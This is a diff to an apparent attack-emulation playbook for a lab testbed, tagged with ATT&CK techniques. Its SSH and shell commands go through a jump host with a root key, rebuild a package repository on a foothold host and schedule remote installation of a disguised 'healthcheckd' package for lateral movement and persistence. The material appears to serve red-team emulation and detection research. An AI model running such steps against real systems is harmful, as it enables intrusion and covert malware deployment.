@@ -7,7 +7,8 @@ vars:
   $SERVER_ADDRESS: fw.attackbed.com
   $ATTACKER_ADDRESS: 192.42.1.174
   $DNS_SERVER: 192.42.0.233
-  $ADMIN_SERVER: 10.12.0.222
+  $ADMIN_SERVER: 10.12.0.223
+  $MGMT_IP: 192.42.0.201
 
 commands:
   - type: shell
@@ -220,7 +221,7 @@ commands:
     metadata:
         techniques: "T1053.003,T1105,T1071.001 "
         tactics: "Persistence,Command and Control"
-        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols "
+        technique_name: "Scheduled Task/Job: Cron,Ingress Tool Transfer,Application Layer Protocol: Web Protocols"
 
   - type: ssh
     session: foothold
@@ -256,11 +257,6 @@ commands:
     cmd: "cd /var/www/html/debian/\n"
     interactive: True
 
-#  - type: ssh
-#    session: foothold
-#    cmd: "rm healthcheckd_1.0-1_amd64.deb\n"
-#    interactive: True
-
   - type: ssh
     session: foothold
     cmd: "dpkg-scanpackages . | gzip -c9  > Packages.gz\n"
@@ -270,15 +266,9 @@ commands:
       tactics: "Execution,Lateral Movement"
       technique_name: "Software Deployment Tools"
 
-
-  - type: ssh
-    cmd: echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 \"apt update && apt install -y healthcheckd\"" | at now + 2 minute
-    hostname: $ADMIN_SERVER
-    username: aecid
-    password: aecid
-    jmp_hostname:  192.42.2.42
-    clear_cache: True
-    exit_on_error: False
+ # connect via jumphost to admin host, that ssh to linuxshare
+  - type: shell
+    cmd: ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o "ProxyCommand=ssh -i ~/.ssh/attacker_mgmt -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -W %h:%p aecid@$MGMT_IP" aecid@10.12.0.223 'echo "ssh -i .ssh/rootkey -o StrictHostKeyChecking=no root@192.168.100.23 '\''apt update && apt install -y healthcheckd'\''" | at now + 2 minute'
     metadata:
       delayed_manifestation: "120s"
 
